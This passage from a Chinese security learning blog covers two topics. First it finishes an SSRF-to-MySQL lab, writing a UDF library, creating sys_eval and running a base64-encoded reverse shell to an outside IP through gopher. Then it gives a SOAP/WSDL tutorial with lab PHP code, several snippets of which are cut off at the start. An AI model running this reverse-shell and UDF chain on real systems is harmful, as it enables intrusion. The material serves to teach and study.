> INTO DUMPFILE ‘/usr/lib/mysql/plugin/udf.so’;
得到数据包后，和之前一样的做法，不再赘述
用脚本处理完通过SSRF发出去，可能一直显示Wait，但是已经写进去了
还是一样，再次本地Liunx模拟一下：
这里一定要先登录再写命令，不然tcpdump抓不到包…巨坑:cry:
    mysql -h127.0.0.1 -uroot
创建自定义函数（参考你导入的动态链接库支持哪些自定义函数）
    CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.so';
在这个[链接](https://www.sqlsec.com/tools.html)JS编码一下命令，bash1的编码不行就换bash2
然后再去执行
    select sys_eval('echo YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMDAuNjAuMjgvMjMzMyAwPiYx|base64 -d|bash -i');
反弹成功！
说明本地使用是没问题的；那么现在抓到流量包后，再放到SSRF里去Gopher：
一定得要有命令执行再继续操作….别不带脑子搞:joy:反弹成功~
###  后话
[国光的SSRF靶场](https://www.sqlsec.com/2021/05/ssrf.html#toc-heading-1)
[不详细的未授权访问总结](https://xz.aliyun.com/t/6103#toc-1)
## Soap+Session反序列化+CRLF
推荐先去这个[链接](https://www.w3school.com.cn/soap/index.asp)了解一下Soap和WebServices，这个[链接](http://staff.ustc.edu.cn/~shizhu/DotNet/WSDLxj.htm)系统性学习WSDL+Soap；不必研究过深，我们不折腾开发的标准化:joy_cat:
Session反序列化相关知识和漏洞见我的笔记
简而言之
  * WebServices用作任何平台、任何语言之间的网络交互，是一种标准，或者说方法
  * 具体的实现依靠WSDL文档（也可以没有）+Soap协议，客户端和服务器端共享一份WSDL文档，其中包含了双方沟通所需要的操作（函数）声明、操作（函数）参数、命名空间等等；相当于一份双方合同
  * Soap协议是建立在HTTP协议+XML格式的数据包上的
可能你实在看不懂，那就看下面的理解一下吧~
###  无WSDL的Soap通信
开两台虚拟机，客户端192.168.0.138，服务端192.168.0.131；实验前记得两边的PHP开启Soap扩展，phpinfo能查询到
该例子来源于[菜鸟教程](https://www.runoob.com/webservices/ws-example.html)
    ";    }    public function getUrl(){        return "www.runoob.com";    }}// 创建 SoapServer 对象$s = new SoapServer(null,array("location"=>"http://localhost/Server.php","uri"=>"Server.php"));// 导出 SiteInfo 类中的全部函数$s->setClass("SiteInfo");// 处理一个SOAP请求，调用必要的功能，并发送回一个响应。$s->handle();?>
    "http://192.168.0.131/Server.php",'uri'=>'Server.php'));  // 调用函数   $result1 = $soap->getName();  $result2 = $soap->__soapCall("getUrl",array());  echo $result1."";  echo $result2;} catch(SoapFault $e){  echo $e->getMessage();}catch(Exception $e){  echo $e->getMessage();}
访问Client.php，能看到下面的效果
查看Wireshark流量得知，no-wsdl下的通信规则相当淳朴:joy:
请求对象的方法
随后返回方法执行后的结果
###  WSDL的Soap通信
该环境是Win10+phpstudy下的，目录为soap/
先从网上找到`SoapDiscovery.class.php`这一公共模板文件（当然也可以找我要哈哈），修改一下：
写一个提供服务的类或者函数
     SOAP_1_2 ) );//$server->setClass ( "Service" ); //注册Service类的所有方法 //$server->handle (); //处理请求?>
写一个文件，用来生成wsdl文件
    getWSDL ();?>
成功的话生成的文件长这个样子
然后自己写个服务端文件
     SOAP_1_2 ) );$server->setClass ( "Service" ); //注册Service类的所有方法 $server->handle (); //处理请求?>
客户端文件
    __setLocation('http://localhost/soap/Service.php');//print_r($client->__getFunctions());//查询函数//print_r($client->__getTypes());//echo $client->HelloWorld();echo $client->Add ( 28, 2 );//echo $client->__soapCall ( 'Add', array ( 28, 2 ) )//或这样调用//echo $result;?>
先访问`http://localhost/soap/service.php`开启服务，然后再访问`http://localhost/soap/client.php`
抓包看看流程，一共分为四步
**第一步**
访问服务端要求WSDL文档。很明显看URI也知道，找的是wsdl文件（合同必须两个人看才行呀，服务端看了客户端也要看）
**第二步**
服务端把WSDL文档全发回来了；和本地的WSDL对照一下，Van全一致:joy:
正好，根据这个包来详细讲解一下WSDL吧~
**WSDL总览**
**\ 元素**
类比函数所需的参数与返回值的类型说明书。接下来开始翻译~
第1-2行，Helloworld函数的所需参数（Request顾名思义，要调用这个函数），这里是无
第3行，Helloworld函数的返回值（Response顾名思义，这个函数的返回值）
第4行，返回的函数名叫Helloworld，返回值类型是xsd:string
第6-9行，Add函数的所需参数;第一个参数为a，类型是xsd:string;第二个参数为b，类型是xsd:string
第10-12行，Add函数的返回值；返回的函数名为Add，返回值类型是xsd:string
**\ 元素**
类比函数库，标签的`name`字段为”函数库名称”;我们之前类里定义的方法，这里都有体现
每一个``标签都是一个函数：
其中`name`字段为函数名称，`input`字段为函数的参数们，`output`字段为函数的返回值
**\ 元素**
将函数与Soap绑定，这样才能被Soap协议带出与实现。
例如第3行的`operation`标签开始指示函数与特定SOAP实现的绑定；第4行`soapaction`标识了该函数是隶属于urn:soap的命名空间下，Service类的Helloworld函数
第5-6行`input`和第7-9行`output`分别为函数的参数和返回值两个方向，其中`body`指定SOAP编码样式和与指定服务关联的名称空间URN
**\ 元素**
定义Web服务支持的端口。哎呀我来翻译一下算了:joy:
我这个名为`soap`的服务，使用的是名为`soapport`的函数库（\元素定义），该函数库和名为`tns:soapBinding`的Soap服务所绑定（\元素定义），你可以从`http://:wsdl.php`访问我这个服务
现在是不是发现WSDL很简单呢~:laughing:
**第三步**
客户端看了WSDL文档知道该发哪些参数了，于是乎~
把Add函数需要的参数通过Soap协议发给服务器端